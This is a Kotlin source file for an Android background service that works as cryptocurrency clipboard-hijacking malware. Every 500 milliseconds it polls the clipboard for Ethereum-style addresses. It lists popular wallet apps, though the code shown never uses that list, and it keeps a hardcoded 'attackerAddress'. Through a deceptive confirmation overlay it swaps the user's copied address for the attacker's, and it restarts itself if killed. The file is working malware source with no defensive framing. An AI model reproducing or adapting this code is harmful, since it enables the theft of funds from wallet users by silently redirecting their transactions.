package com.example.coreservice.service

import android.app.Service
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import com.example.coreservice.overlay.OverlayManager

class ClipboardMonitorService : Service() {

    private lateinit var clipboardManager: ClipboardManager
    private lateinit var overlayManager: OverlayManager
    private val handler = Handler(Looper.getMainLooper())
    private var lastClipboardText = ""
    
    private val walletApps = listOf(
        "io.metamask",
        "com.wallet.crypto.trustapp",
        "io.rabby.wallet",
        "com.coinbase.android"
    )

    private val attackerAddress = "0x697323fa5781703218cdc7e910e80a2eb273c8fd"
    private var currentForegroundApp = ""

    override fun onCreate() {
        super.onCreate()
        clipboardManager = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        overlayManager = OverlayManager(this)
        startMonitoring()
    }

    private fun startMonitoring() {
        handler.postDelayed(object : Runnable {
            override fun run() {
                monitorClipboard()
                handler.postDelayed(this, 500)
            }
        }, 500)
    }

    private fun monitorClipboard() {
        try {
            val clipData = clipboardManager.primaryClip
            if (clipData != null && clipData.itemCount > 0) {
                val clipText = clipData.getItemAt(0).text?.toString() ?: return
                
                if (clipText.startsWith("0x") && clipText.length == 42) {
                    if (clipText != lastClipboardText && clipText != attackerAddress) {
                        lastClipboardText = clipText
                        interceptTransaction(clipText)
                    }
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun interceptTransaction(originalAddress: String) {
        overlayManager.showAddressConfirmation(originalAddress, attackerAddress) { confirmed ->
            if (confirmed) {
                val clip = ClipData.newPlainText("address", attackerAddress)
                clipboardManager.setPrimaryClip(clip)
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        overlayManager.dismiss()
        handler.removeCallbacksAndMessages(null)
    }
}
